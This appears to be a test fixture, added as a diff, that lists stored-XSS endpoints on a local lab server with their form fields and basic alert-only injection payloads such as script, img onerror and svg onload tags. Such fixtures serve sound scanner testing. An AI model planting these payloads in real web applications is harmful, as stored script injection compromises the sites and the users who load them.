@@ -1,0 +1,87 @@
+{
+  "_meta": {
+    "category": "Stored",
+    "description": "Stored XSS endpoints — payloads stored server-side and reflected on subsequent page loads",
+    "target": "http://localhost:9090"
+  },
+  "endpoints": [
+    {
+      "name": "stored-comments",
+      "category": "Stored",
+      "url": "http://localhost:9090/stored/comments",
+      "method": "POST",
+      "params": ["name", "body"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:9090/stored/comments",
+      "form_fields": {"name": "XSS Test", "body": "test"},
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "body", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>alert(1)</script>", "target_param": "body", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "body", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "body", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "stored-guestbook",
+      "category": "Stored",
+      "url": "http://localhost:9090/stored/guestbook",
+      "method": "POST",
+      "params": ["name", "msg"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:9090/stored/guestbook",
+      "form_fields": {"name": "Guest", "msg": "hello"},
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "msg", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "msg", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "stored-profile-bio",
+      "category": "Stored",
+      "url": "http://localhost:9090/stored/profile",
+      "method": "POST",
+      "params": ["bio"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:9090/stored/profile",
+      "form_fields": {"bio": "", "website": "https://example.com"},
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "bio", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>alert(1)</script>", "target_param": "bio", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "bio", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "stored-profile-website",
+      "category": "Stored",
+      "url": "http://localhost:9090/stored/profile",
+      "method": "POST",
+      "params": ["website"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:9090/stored/profile",
+      "form_fields": {"bio": "Security researcher", "website": ""},
+      "payloads": [
+        {"payload": "\"><img src=x onerror=alert(1)>", "target_param": "website", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "stored-notes",
+      "category": "Stored",
+      "url": "http://localhost:9090/stored/notes",
+      "method": "POST",
+      "params": ["title", "content"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:9090/stored/notes",
+      "form_fields": {"title": "Note Title", "content": "Note content"},
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "content", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>alert(1)</script>", "target_param": "content", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "content", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
